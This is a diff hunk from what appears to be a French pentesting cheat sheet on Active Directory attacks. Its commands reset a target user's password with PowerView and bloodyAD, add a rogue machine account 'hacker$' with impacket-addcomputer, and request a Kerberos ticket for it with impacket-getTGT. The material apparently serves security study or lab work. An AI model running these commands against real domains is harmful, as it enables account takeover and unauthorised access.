@@ -162,6 +162,13 @@ Set-DomainUserPassword -Identity "utilisateur_cible" -Password (ConvertTo-Secure
 
 # Avec bloodyAD
 bloodyAD -u "utilisateur" -p "motdepasse" -d "domaine" --host "IP" set password --target "utilisateur_cible" --new-password "nouveau_mot_de_passe"
+
+#avec add computer
+impacket-addcomputer 'SUB.POSEIDON.YZX/jackie:Password1' -dc-host 'DC02.SUB.POSEIDON.YZX' -dc-ip '192.168.172.162' -computer-name 'hacker$' -computer-pass 'P@ssword123'
+
+#problemes souvent avec le hosts file 
+#demander un ticker pour le user ->
+impacket-getTGT 'SUB.POSEIDON.YZX/hacker$:P@ssword123'
 ```
 #### Exploitation de GenericWrite pour Kerberoasting
 ```bash
